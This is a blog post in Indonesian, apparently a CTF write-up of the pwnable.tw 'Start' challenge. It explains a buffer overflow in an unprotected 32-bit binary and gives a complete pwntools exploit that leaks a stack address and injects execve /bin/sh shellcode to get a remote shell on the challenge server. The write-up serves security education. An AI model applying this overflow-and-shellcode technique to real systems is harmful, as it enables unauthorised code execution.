<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Pwnable.tw - Start (100)</title>
  <meta name="description" content="Diberikan sebuah binary bernama start, yang vulnerable buffer overflow, karena buffer inputan lebih besar dari buffer variable penampung.">
  
  <meta name="author" content="rhama">
  <meta name="copyright" content="&copy; rhama 2018">
  

  <!-- External libraries -->
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/monokai.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/css/lightbox.css">

  <!-- Favicon and other icons (made with http://www.favicon-generator.org/) -->
  <link rel="shortcut icon" href="/assets/icons/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon">
  <link rel="apple-touch-icon" sizes="57x57" href="/assets/icons/apple-icon-57x57.png">
  <link rel="apple-touch-icon" sizes="60x60" href="/assets/icons/apple-icon-60x60.png">
  <link rel="apple-touch-icon" sizes="72x72" href="/assets/icons/apple-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="76x76" href="/assets/icons/apple-icon-76x76.png">
  <link rel="apple-touch-icon" sizes="114x114" href="/assets/icons/apple-icon-114x114.png">
  <link rel="apple-touch-icon" sizes="120x120" href="/assets/icons/apple-icon-120x120.png">
  <link rel="apple-touch-icon" sizes="144x144" href="/assets/icons/apple-icon-144x144.png">
  <link rel="apple-touch-icon" sizes="152x152" href="/assets/icons/apple-icon-152x152.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/icons/apple-icon-180x180.png">
  <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icons/android-icon-192x192.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/icons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="96x96" href="/assets/icons/favicon-96x96.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/icons/favicon-16x16.png">
  <link rel="manifest" href="/assets/icons/manifest.json">
  <meta name="msapplication-TileColor" content="#ffffff">
  <meta name="msapplication-TileImage" content="/assets/icons/ms-icon-144x144.png">
  <meta name="theme-color" content="#ffffff">

  
  <!-- Facebook OGP cards -->
<!--   <meta property="og:description" content="Diberikan sebuah binary bernama start, yang vulnerable buffer overflow, karena buffer inputan lebih besar dari buffer variable penampung." />
  <meta property="og:url" content="https://rhama.my.id" />
  <meta property="og:site_name" content="CTF.Ninja" />
  <meta property="og:title" content="Pwnable.tw - Start (100)" />
  <meta property="og:type" content="website" />
  <meta property="og:image" content="https://rhama.my.id/assets/images/ctf.png" />
  <meta property="og:image:type" content="image/png" />
  <meta property="og:image:width" content="612" />
  <meta property="og:image:height" content="605" /> -->
<meta content="https://rhama.my.id/assets/images/ctf.png" property="og:image" />
<meta content="CTF.Ninja" property="og:site_name" />
<meta content="object" property="og:type" />
<meta content="Pwnable.tw - Start (100)" property="og:title" />
<meta content="https://rhama.my.id/ctf/binary%20exploit/2017/11/06/pwnabletw-start.html" property="og:url" />
<meta content="Diberikan sebuah binary bernama start, yang vulnerable buffer overflow, karena buffer inputan lebih besar dari buffer variable penampung." property="og:description" />

  

  

  

  <!-- Site styles -->
  <link rel="stylesheet" href="/css/main.css">
   <link rel="stylesheet" href="/css/terminal.css">
  <link rel="canonical" href="https://rhama.my.id/ctf/binary%20exploit/2017/11/06/pwnabletw-start.html">
  <link rel="alternate" type="application/rss+xml" title="CTF.Ninja" href="https://rhama.my.id/feed.xml" />
</head>


  <body>

    <header class="navigation" role="banner">
  <div class="navigation-wrapper">
    <a href="/" class="logo">
      
      <img src="/assets/logo.png" alt="CTF.Ninja">
      
    </a>
    <a href="javascript:void(0)" class="navigation-menu-button" id="js-mobile-menu">
      <i class="fa fa-bars"></i>
    </a>
    <nav role="navigation">
      <ul id="js-navigation-menu" class="navigation-menu show">
        
          
          <li class="nav-link"><a href="/about/">About</a>
          
        
          
          <li class="nav-link"><a href="/posts/">Archives</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      </ul>
    </nav>
  </div>
</header>


    <div class="page-content">
        <div class="post">

<div class="post-header-container has-cover" style="background-image: url(/assets/images/ctf.png);">
  <div class="scrim has-cover">
    <header class="post-header">
      <h1 class="title">Pwnable.tw - Start (100)</h1>
      <p class="info">by <strong>Aiden Pearce</strong></p>
    </header>
  </div>
</div>

<div class="wrapper">



<section class="post-meta">
  <div class="post-date">November 6, 2017</div>
  <div class="post-categories">
  in 
    
    <a href="/category/CTF">Ctf</a>, 
    
  
    
    <a href="/category/Binary Exploit">Binary exploit</a>
    
  
  </div>
</section>

<article class="post-content">
  <p>Diberikan sebuah binary bernama start, yang vulnerable buffer overflow, karena buffer inputan lebih besar dari buffer variable penampung.</p>

<p>Berikut informasi binary start.</p>
<pre style="background:#000;color:#f8f8f8;">$ <span style="color:#9b859d;">file</span> start                                                                                                                      
start: ELF <span style="color:#3387cc;">32</span><span style="color:#e28964;">-</span>bit LSB executable, Intel <span style="color:#3387cc;">80386</span>, version <span style="color:#3387cc;">1</span> (SYSV), statically linked, <span style="color:#e28964;">not</span> stripped
$ checksec start                                                                                                                  
[<span style="color:#e28964;">*</span>] <span style="color:#65b042;">'start'</span>
    Arch:     i386<span style="color:#e28964;">-</span><span style="color:#3387cc;">32</span><span style="color:#e28964;">-</span>little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (<span style="color:#3387cc;">0x8048000</span>)

</pre>
<p>Hasil disassembly menggunaan Binary Ninja pada fungsi _start
<img class="wp-image-95 size-lodestar-featured-image aligncenter" src="https://bytetolong.files.wordpress.com/2017/11/screenshot_2017-11-13_20-13-39.png?w=433&amp;h=482&amp;crop=1" alt="" width="433" height="482" /></p>

<p>Diketahui bahwa binary start ditulis menggunakan asm x86 dan menggunakan 3 syscall yaitu write, read dan exit. Referensi tentang syscall dapat dilihat <a href="https://syscalls.kernelgrok.com/">disini</a></p>

<p>Pada bagian warna biru adalah proses pemanggilan syscall write dan bagian warna merah adalah pemanggilan syscall read . Lalu bagian kuning paling bawah adalah prospes stack akan di naikan sebanyak 20 bytes, sehingga Top Of Stack nya adalah alamat dari fungsi _exit dan program akan loncat ke fungsi _exit untuk mengakhiri eksekusi.</p>

<p>Apabila code nya di convert ke C kira-kira seperti berikut</p>
<pre style="background:#000;color:#f8f8f8;">void main(void){
    char buf[<span style="color:#3387cc;">20</span>] <span style="color:#e28964;">=</span> <span style="color:#65b042;">"Let's start the CTF:"</span>;
    write(<span style="color:#3387cc;">1</span>,buf,<span style="color:#3387cc;">20</span>);
    read(<span style="color:#3387cc;">0</span>,buf,<span style="color:#3387cc;">60</span>)
    exit();
}
void exit(){
    exit(<span style="color:#3387cc;">0</span>);
}
</pre>
<p><strong>How To Get A Shell ?</strong></p>

<p>Karena binary nya sama sekali tidak memiliki proteksi, kita dapat dengan mudah inject shellcode lalu loncat ke shellcode berada. Dengan asumsi bahwa ASLR dalam keadaaan ON, kita dapat meleak Stack  Address lalu mengkalkulasikan jarak antara Stack address dan  tempat shellcode berada.</p>

<p>Pada dasar nya program start akan mem PUSH 28 bytes data ke dalam stack, berikut Layout Stack nya</p>
<pre style="background:#000;color:#f8f8f8;">                <span style="color:#e28964;">+</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">+</span>
Top Of Stack <span style="color:#e28964;">=</span><span style="color:#e28964;">&gt;</span> <span style="color:#e28964;">|</span>  <span style="color:#3387cc;">0x2774654c</span>  <span style="color:#e28964;">| // 'Let''</span>
                <span style="color:#e28964;">+</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">+</span>
                <span style="color:#e28964;">|</span>  <span style="color:#3387cc;">0x74732073</span>  <span style="color:#e28964;">| // 's st'</span>
                <span style="color:#e28964;">+</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">+</span>
                <span style="color:#e28964;">|</span>  <span style="color:#3387cc;">0x20747261</span>  <span style="color:#e28964;">| // 'art '</span>
                <span style="color:#e28964;">+</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">+</span>
                <span style="color:#e28964;">|</span>  <span style="color:#3387cc;">0x20656874</span>  <span style="color:#e28964;">| // 'the '</span>
                <span style="color:#e28964;">+</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">+</span>
                <span style="color:#e28964;">|</span>  <span style="color:#3387cc;">0x3a465443</span>  <span style="color:#e28964;">| // 'CTF:'</span>
                <span style="color:#e28964;">+</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">+</span>
                <span style="color:#e28964;">|</span>  <span style="color:#3387cc;">0x804809d</span>   <span style="color:#e28964;">| // syscall_exit</span>
                <span style="color:#e28964;">+</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">+</span>
                <span style="color:#e28964;">|</span>     esp      <span style="color:#e28964;">|</span>
                <span style="color:#e28964;">+</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">-</span><span style="color:#e28964;">+</span>
</pre>
<p>Dari Layout Stack diatas dapat di pastikan untuk mengoverwrite Return Address atau EIP nya dibutuhkan 20 bytes. Lalu arahkan eksekusi program ke instruksi mov ecx, esp (pada alamat : 0x8048087). sehingga program akan mengluarkan output yang berisi Stack Address.</p>
<pre style="background:#000;color:#f8f8f8;"><span style="color:#e28964;">from</span> pwn <span style="color:#e28964;">import</span> <span style="color:#e28964;">*</span>

context(<span style="color:#3e87e3;">arch</span> <span style="color:#e28964;">=</span> <span style="color:#65b042;">"i386"</span>,<span style="color:#3e87e3;">os</span><span style="color:#e28964;">=</span><span style="color:#65b042;">"linux"</span>)

<span style="color:#aeaeae;font-style:italic;"># http://shell-storm.org/shellcode/files/shellcode-811.php</span>
shellcode <span style="color:#e28964;">=</span> <span style="color:#65b042;">""</span>
shellcode <span style="color:#e28964;">+=</span> <span style="color:#65b042;">"<span style="color:#ddf2a4;">\x31</span>\xc0<span style="color:#ddf2a4;">\x50</span><span style="color:#ddf2a4;">\x68</span>\x2f\x2f<span style="color:#ddf2a4;">\x73</span>"</span>
shellcode <span style="color:#e28964;">+=</span> <span style="color:#65b042;">"<span style="color:#ddf2a4;">\x68</span><span style="color:#ddf2a4;">\x68</span>\x2f<span style="color:#ddf2a4;">\x62</span><span style="color:#ddf2a4;">\x69</span>\x6e<span style="color:#ddf2a4;">\x89</span>"</span>
shellcode <span style="color:#e28964;">+=</span> <span style="color:#65b042;">"\xe3<span style="color:#ddf2a4;">\x89</span>\xc1<span style="color:#ddf2a4;">\x89</span>\xc2\xb0\x0b"</span>
shellcode <span style="color:#e28964;">+=</span> <span style="color:#65b042;">"\xcd<span style="color:#ddf2a4;">\x80</span><span style="color:#ddf2a4;">\x31</span>\xc0<span style="color:#ddf2a4;">\x40</span>\xcd<span style="color:#ddf2a4;">\x80</span>"</span>
mov_ecx_esp <span style="color:#e28964;">=</span> p32(<span style="color:#3387cc;">0x08048087</span>)

start <span style="color:#e28964;">=</span> remote(<span style="color:#65b042;">"chall.pwnable.tw"</span>,<span style="color:#3387cc;">10000</span>)
start.recvuntil(<span style="color:#65b042;">"CTF:"</span>)
payload <span style="color:#e28964;">=</span> <span style="color:#65b042;">"A"</span> <span style="color:#e28964;">*</span> <span style="color:#3387cc;">20</span> <span style="color:#e28964;">+</span> mov_ecx_esp
start.send(payload)
stack<span style="color:#e28964;">=</span> start.recv(<span style="color:#3387cc;">4</span>)
stack_addr <span style="color:#e28964;">=</span> u32(stack)
<span style="color:#e28964;">print</span> <span style="color:#dad085;">hex</span>(stack_addr)
payload_next<span style="color:#e28964;">=</span><span style="color:#65b042;">"A"</span><span style="color:#e28964;">*</span><span style="color:#3387cc;">20</span><span style="color:#e28964;">+</span>p32(stack_addr<span style="color:#e28964;">+</span><span style="color:#3387cc;">20</span>)<span style="color:#e28964;">+</span> <span style="color:#65b042;">"<span style="color:#ddf2a4;">\x90</span>"</span> <span style="color:#e28964;">*</span> <span style="color:#3387cc;">4</span> <span style="color:#e28964;">+</span> shellcode 
start.sendline(payload_next) 
start.interactive()
</pre>

</article>



<section class="tags">
  <strong>Tags:</strong> <a href="/tag/pwnabletw">pwnabletw</a>,&nbsp;<a href="/tag/CTF">CTF</a>
</section>



<section class="rss">
  <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
</section>

<section class="share">
  <span>Share: </span>
  
    
    
    
      <a href="//www.facebook.com/sharer.php?t=Pwnable.tw+-+Start+%28100%29&u=https%3A%2F%2Frhama.my.id%2Fctf%2Fbinary%2520exploit%2F2017%2F11%2F06%2Fpwnabletw-start.html"
        onclick="window.open(this.href, 'facebook-share', 'width=550,height=255');return false;">
        <i class="fa fa-facebook-square fa-lg"></i>
      </a>
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
      <a href="//www.reddit.com/submit" onclick="window.location = '//www.reddit.com/submit?url=' + encodeURIComponent('https://rhama.my.id/ctf/binary%20exploit/2017/11/06/pwnabletw-start.html') + '&title=Pwnable.tw - Start (100)'; return false">
        <i class="fa fa-reddit-square fa-lg"></i>
      </a>
    
    
  
    
    
    
    
    
    
    
    
  
</section>




</div>
</div>

    </div>

    <footer class="site-footer">

  <div class="wrapper">

    <h3 class="footer-heading">CTF.Ninja</h3>

    <div class="site-navigation">

      <p><strong>Site Map</strong></p>
      <ul class="pages">
        
        
          <li class="nav-link"><a href="/about/">About</a>
        
        
        
          <li class="nav-link"><a href="/posts/">Archives</a>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
      </ul>
    </div>

    <div class="site-contact">

      <p><strong>Contact</strong></p>
      <ul class="social-media-list">
        <li>
          <a href="mailto:r4m@protonmail.com">
            <i class="fa fa-envelope-o"></i>
            <span class="username">r4m@protonmail.com</span>
          </a>
        </li>

        
          
          <li>
            <a href="https://www.facebook.com/eat.sleep.pwn.repeat" title="Friend me on Facebook">
              <i class="fa fa-facebook"></i>
              <span class="username">eat.sleep.pwn.repeat</span>
            </a>
          </li>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        

      </ul>
    </div>

    <div class="site-signature">
      <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
      <p class="text">CTF, InfoSec, Banana And More.
</p>
    </div>

  </div>

</footer>

<!-- Scripts -->
<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/highlight.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/js/lightbox.min.js"></script>

<script type="text/javascript">
$(document).ready(function() {
  // Default syntax highlighting
  hljs.initHighlightingOnLoad();

  // Header
  var menuToggle = $('#js-mobile-menu').unbind();
  $('#js-navigation-menu').removeClass("show");
  menuToggle.on('click', function(e) {
    e.preventDefault();
    $('#js-navigation-menu').slideToggle(function(){
      if($('#js-navigation-menu').is(':hidden')) {
        $('#js-navigation-menu').removeAttr('style');
      }
    });
  });
});

</script>






  </body>

</html>
